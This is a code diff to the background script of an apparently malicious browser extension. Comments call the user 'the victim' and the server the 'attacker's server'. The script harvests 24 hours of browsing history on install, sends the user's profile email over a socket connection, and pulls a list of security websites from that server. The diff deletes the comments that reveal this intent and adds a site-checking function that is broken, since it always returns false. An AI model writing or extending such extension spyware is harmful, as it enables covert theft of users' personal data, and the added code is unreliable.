@@ -1,7 +1,7 @@
 chrome.runtime.onInstalled.addListener(() => {
   // Connect to server for the first time and get security websites
   var socket = connectToServer();
-  getSecurityWebsites(socket);
+  updateSecurityWebsites(socket);
   // Retrieves the browser history of the victim for the last 24 hours on install
   chrome.history.search({
     text: ''
@@ -21,13 +21,11 @@ chrome.runtime.onInstalled.addListener(() => {
 });
 
 chrome.runtime.onStartup.addListener(() => {
-  // Connect to the socket server and get security websites
   var socket = connectToServer();
-  getSecurityWebsites(socket);
+  updateSecurityWebsites(socket);
 });
 
 chrome.runtime.onSuspend.addListener(() => {
-  // Disconnect from server
   disconnectFromServer(socket);
 });
 
@@ -36,11 +34,7 @@ chrome.runtime.onMessage.addListener((request, sender) => {
 });
 
 function connectToServer() {
-  // Connect to attacker's server
   socket = io('http://localhost:3000');
-
-  // When user is connected, send user data
-  chrome.storage.sync.clear();
   chrome.identity.getProfileUserInfo((userInfo) => {
     if (userInfo.email == null) {
       userInfo.email = "No email";
@@ -52,14 +46,22 @@ function connectToServer() {
 }
 
 function disconnectFromServer(socket) {
-  // Disconnect socket
   socket.disconnect();
 }
 
-function getSecurityWebsites(socket) {
+function updateSecurityWebsites(socket) {
   socket.on('securityWebsites', (securityWebsites) => {
     chrome.storage.sync.set({
       'securityWebsites': securityWebsites
     });
   });
+}
+
+function checkSecurityWebsites(website) {
+  chrome.storage.sync.get('securityWebsites', (securityWebsites) => {
+    for (var i = 0; i < securityWebsites.length; i++) {
+      if (website.includes(securityWebsites[i])) return true;
+    }
+  });
+  return false;
 }
